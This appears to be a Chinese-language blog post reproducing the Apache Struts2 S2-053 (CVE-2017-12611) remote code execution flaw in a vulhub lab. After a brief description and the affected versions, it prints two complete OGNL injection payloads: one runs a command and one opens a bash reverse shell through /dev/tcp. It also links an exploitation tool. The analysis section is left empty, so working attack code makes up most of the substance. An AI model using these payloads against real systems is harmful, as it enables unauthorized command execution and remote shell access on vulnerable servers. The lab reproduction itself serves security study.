# CVE-2017-12611 S2-053 复现 - 美式加糖 - 博客园

> 原文：[`www.cnblogs.com/peace-and-romance/p/15652528.html`](https://www.cnblogs.com/peace-and-romance/p/15652528.html)

### 0X00-引言

* * *

少年不识愁，笑谈这风流

### 0X01-环境搭建

* * *

靶机：CentOS Linux 7

攻击机：windows server 2016 && Kail

环境：vulhub

项目地址：[`github.com/vulhub/vulhub`](https://github.com/vulhub/vulhub)

搭建 vulhub 请访问：[空白 centos7 64 搭建 vulhub(详细)](https://www.cnblogs.com/peace-and-romance/p/15621658.html)

### 0X02-漏洞描述

* * *

Struts2 在使用 Freemarker 模板引擎的时候，同时允许解析 OGNL 表达式。导致用户输入的数据本身不会被 OGNL 解析，但由于被 Freemarker 解析一次后变成离开一个表达式，被 OGNL 解析第二次，导致任意命令执行漏洞。

影响版本：Struts 2.0.1 - Struts 2.3.33, Struts 2.5 - Struts 2.5.10

漏洞详情：[`struts.apache.org/docs/s2-053.html`](http://struts.apache.org/docs/s2-053.html)

### 0X03-漏洞复现

* * *

`http://192.168.234.128:8080/hello.action`

![image-20211206201211488](img/34c8f4cc81f6516f19cff315bd00a63c.png)

##### 01-任意命令执行

输入 POC 时，最后一行要跟一个换行

POC:

```
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))} 
```

![image-20211206201401148](img/6ce65b22b0fb63fe28a7b959cd5305db.png)

##### 02-反弹 shell

注意换行

```
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='bash -i >&/dev/tcp/ip/port 0>&1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))} 
```

先打开监听在提交 POC

![image-20211206202023166](img/bc9befbd95d0865d0519c5e4fac0bb7f.png)

![image-20211206202120048](img/df9cea7741583f5c0499c79cdfa52468.png)

### 0X04-漏洞分析

* * *

略

### 0X05-工具利用

* * *

工具地址：[`github.com/Liqunkit/LiqunKit_`](https://github.com/Liqunkit/LiqunKit_)

虽然说检测的不是 S2-053，也能用

![image-20211206202453892](img/2b19ff3a3e8962f78bfc9bb1b05a1a90.png)

* * *

命令执行

![image-20211206202602825](img/07a4d4eb85a23867d63d58e0be645c6f.png)

文件上传

![image-20211206202743002](img/947765ff3919696199bd8a9a58ed08d9.png)

失败

### 0X07-参考

* * *

[S2-053 远程代码执行漏洞](https://github.com/vulhub/vulhub/blob/master/struts2/s2-053/README.zh-cn.md)